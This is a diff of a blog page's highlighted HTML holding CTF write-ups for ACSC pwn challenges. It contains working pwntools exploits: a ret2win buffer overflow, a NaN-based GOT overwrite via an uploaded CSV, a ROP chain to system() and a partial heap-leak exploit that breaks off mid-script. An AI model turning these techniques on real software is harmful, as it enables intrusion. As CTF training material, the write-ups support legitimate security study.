@@ -204,24 +204,24 @@ PIE:      No PIE (0x400000)
 <p>No canary and PIE is disabled. So, we can do a simple <code class="language-plaintext highlighter-rouge">ret2win</code> by giving a negative number. I chose <code class="language-plaintext highlighter-rouge">-1</code> for maximum bytes.<br />
 Just calculate the offset upto RIP and put address of <code class="language-plaintext highlighter-rouge">win</code> and you get the flag.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">p</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'filtered.chal.acsc.asia'</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">filtered.chal.acsc.asia</span><span class="sh">'</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./filtered'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./filtered</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'-1'</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">280</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-1</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">280</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">))</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}</code></p>
@@ -295,13 +295,13 @@ Using <code class="language-plaintext highlighter-rouge">-0</code> works same as
 But, <code class="language-plaintext highlighter-rouge">NaN</code> is special. The standard defines interesting properties for it. The most interesting are the comparisons. Whenever <code class="language-plaintext highlighter-rouge">NaN</code> is compared to a number-like variable, the comparison evaluates to <code class="language-plaintext highlighter-rouge">False</code>. Even <code class="language-plaintext highlighter-rouge">NaN == NaN</code> is not true.<br />
 So, using <code class="language-plaintext highlighter-rouge">NaN,1</code> passes the check. Its value is actually <code class="language-plaintext highlighter-rouge">0x80000000</code>. After all the arithmetic, it becomes <code class="language-plaintext highlighter-rouge">0x7fffffff</code> and lands us at <code class="language-plaintext highlighter-rouge">0x404028</code> which is GOT for <code class="language-plaintext highlighter-rouge">fread</code>. Increasing <code class="language-plaintext highlighter-rouge">height</code> by multilples of ten lets us move across the GOT and, hence, increment any GOT value.<br /> 
 I decided to increment GOT of <code class="language-plaintext highlighter-rouge">fclose</code> because it is executed at end and has no occurences before that. So, the GOT will have a binary address. <code class="language-plaintext highlighter-rouge">NaN,30</code> lands us at GOT of <code class="language-plaintext highlighter-rouge">fclose</code>. I need to increment it <code class="language-plaintext highlighter-rouge">0x401268 - 0x401060 = 0x208</code> times. I created <code class="language-plaintext highlighter-rouge">exploit.csv</code> using the following one-liner.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s">'exploit.csv'</span><span class="p">,</span> <span class="s">'w+'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="s">'NaN,30</span><span class="se">\n</span><span class="s">'</span><span class="o">*</span><span class="mh">0x208</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">exploit.csv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w+</span><span class="sh">'</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="s">NaN,30</span><span class="se">\n</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x208</span><span class="p">)</span>
 </code></pre></div></div>
 <p>The website had some issues so I used the following python script to send the file.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
 
-<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://histogram.chal.acsc.asia/api/histogram'</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">"csv"</span> <span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.csv"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">https://histogram.chal.acsc.asia/api/histogram</span><span class="sh">'</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">csv</span><span class="sh">"</span> <span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exploit.csv</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{NaN_demo_iiyo}</code></p>
 
@@ -369,42 +369,42 @@ This program does not have a <code class="language-plaintext highlighter-rouge">
 One thing to note about this challenge is that we don’t have direct interaction with the binary. Following script works as a proxy between us and the binary.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
 </span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="nb">exit</span>
-<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">from</span> <span class="n">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="nb">exit</span>
+<span class="kn">from</span> <span class="n">socket</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">LIMIT</span> <span class="o">=</span> <span class="mi">4096</span>
 
-<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-  <span class="n">s</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
   <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span>
 
-  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">LIMIT</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">'You are too greedy'</span><span class="p">)</span>
-    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+  <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">LIMIT</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">You are too greedy</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-  <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">:</span>
+  <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">:</span>
     <span class="k">break</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">11452</span><span class="p">))</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">11452</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 
-<span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">setblocking</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
-<span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">setblocking</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
 <span class="k">try</span><span class="p">:</span>
   <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="n">s</span><span class="p">:</span>
       <span class="k">break</span>
     <span class="n">res</span> <span class="o">+=</span> <span class="n">s</span>
 <span class="k">except</span><span class="p">:</span>
   <span class="k">pass</span>
 
-<span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+<span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Lets check protections enabled.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RELRO:    Full RELRO
@@ -448,17 +448,17 @@ jmp [rbp]              // system(&amp;gif)
 </code></pre></div></div>
 <p>My exploit:</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">p</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'167.99.78.201'</span><span class="p">,</span> <span class="mi">11451</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">167.99.78.201</span><span class="sh">'</span><span class="p">,</span> <span class="mi">11451</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">LD_PRELOAD</span><span class="sh">"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./carot'</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.31.so'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./carot</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc-2.31.so</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="n">pop_rbp</span>                <span class="o">=</span> <span class="mh">0x400828</span>
 <span class="n">pop_rdi</span>                <span class="o">=</span> <span class="mh">0x4010d3</span>
@@ -474,7 +474,7 @@ jmp [rbp]              // system(&amp;gif)
 
 <span class="n">jmp_qword_rbp</span>          <span class="o">=</span> <span class="mh">0x4014fb</span>
 
-<span class="n">junk</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">'JUNKJUNK'</span><span class="p">)</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">JUNKJUNK</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
     <span class="n">pop_rbp</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">printf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span>
@@ -501,24 +501,24 @@ jmp [rbp]              // system(&amp;gif)
     <span class="n">jmp_qword_rbp</span>
 <span class="p">]</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ropchain</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ropchain</span><span class="p">])</span>
 
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">536</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">536</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag.txt</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{buriburi_1d3dfb9bf7654412}</code></p>
 
 <h1 id="bvar---380-pts---22-solves">bvar - 380 pts - 22 solves</h1>
 <p>Relevant code below:</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span>
 <span class="k">struct</span> <span class="n">node_data</span><span class="p">{</span>
 	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
@@ -658,93 +658,93 @@ gef➤  x/gx 0x000055713605a428
 To get the specific implemention, I leaked the <code class="language-plaintext highlighter-rouge">strlen</code>’s address on remote using the same leaking mechanism because after <code class="language-plaintext highlighter-rouge">strlen</code> there’s is <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>’s GOT which is same on my machine and remote server. Then simple offset calculation.<br />
 Final exploit below:</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">p</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'167.99.78.201'</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">167.99.78.201</span><span class="sh">'</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span> <span class="o">+</span> <span class="s">":./ld-2.31.so"</span><span class="p">})</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">LD_PRELOAD</span><span class="sh">"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span> <span class="o">+</span> <span class="sh">"</span><span class="s">:./ld-2.31.so</span><span class="sh">"</span><span class="p">})</span>
 
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">name</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'='</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="n">name</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">name</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'delete '</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">delete </span><span class="sh">'</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'edit '</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
-    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">new_name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">edit </span><span class="sh">'</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">new_name</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">clear</span><span class="p">():</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="s">'clear'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">clear</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./bvar_patched'</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.31.so'</span><span class="p">)</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./bvar_patched</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc-2.31.so</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
-<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test2'</span><span class="p">)</span>
-<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1234</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">test1</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">b</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">4321</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">test2</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\xc8</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>
-<span class="n">show</span><span class="p">(</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span>
-<span class="n">binary_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">c</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xc8</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">hack</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">show</span><span class="p">(</span><span class="sa">b</span><span class="sh">''</span><span class="p">)</span>
